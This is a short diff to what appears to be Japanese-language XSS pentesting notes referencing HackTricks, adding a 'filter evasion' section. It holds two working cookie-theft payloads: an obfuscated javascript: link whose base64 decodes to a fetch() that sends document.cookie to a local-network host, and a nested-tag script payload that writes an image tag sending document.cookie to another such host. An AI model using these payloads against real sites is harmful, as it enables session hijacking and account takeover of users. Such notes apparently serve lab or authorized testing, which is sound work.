@@ -30,6 +30,12 @@ https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.ht
 <a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("ZmV0Y2goYGh0dHA6Ly8xOTIuMTY4LjEyOS42MDo4MDAwLyR7ZG9jdW1lbnQuY29va2llfWApOw=="))>test</a>
 ```
 
+### フィルター回避
+
+```js
+&lt;sscriptcript&gt;document.write('&lt;img src="http://192.168.128.106:8000/'+document.cookie+'"&gt;')&lt;/sscriptcript&gt;
+```
+
 ### 画面上の要素を送信
 
 - textarea上に `<script>` が丸々表示される場合は、クローズタグを試す価値がある。
